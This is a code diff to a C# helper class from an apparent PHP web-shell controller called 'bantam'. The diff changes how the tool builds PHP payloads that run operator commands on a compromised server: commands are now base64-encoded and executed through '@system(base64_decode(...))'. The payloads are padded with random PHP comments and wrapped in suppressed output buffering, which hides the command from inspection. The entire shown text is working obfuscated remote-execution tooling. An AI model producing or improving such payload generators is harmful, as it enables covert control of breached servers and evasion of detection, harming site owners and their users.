@@ -1,7 +1,6 @@
-﻿using System;
-using System.Collections.Generic;
+﻿using System.Collections.Generic;
 
-namespace bantam_php
+namespace bantam.Classes
 {
     class PhpHelper
     {
@@ -485,18 +484,19 @@ namespace bantam_php
         /// <returns></returns>
         public static string ExecuteSystemCode(string code, bool encryptResponse)
         {
+            code = Helper.EncodeBase64ToString(code);
             if (encryptResponse) {
                 return RandomPHPComment() 
                     + "@ob_start();" 
                     + RandomPHPComment() 
-                    + "@system('" + code + "');" 
+                    + "@system(base64_decode('" + code + "'));" 
                     + RandomPHPComment() 
                     + "$result = @ob_get_contents();"
                     + RandomPHPComment()
                     + "@ob_end_clean();"
                     + RandomPHPComment();
             } else {
-                return RandomPHPComment() + "@system('" + code + "');" + RandomPHPComment();
+                return RandomPHPComment() + "@system(base64_decode('" + code + "'));" + RandomPHPComment();
             }
         }
 
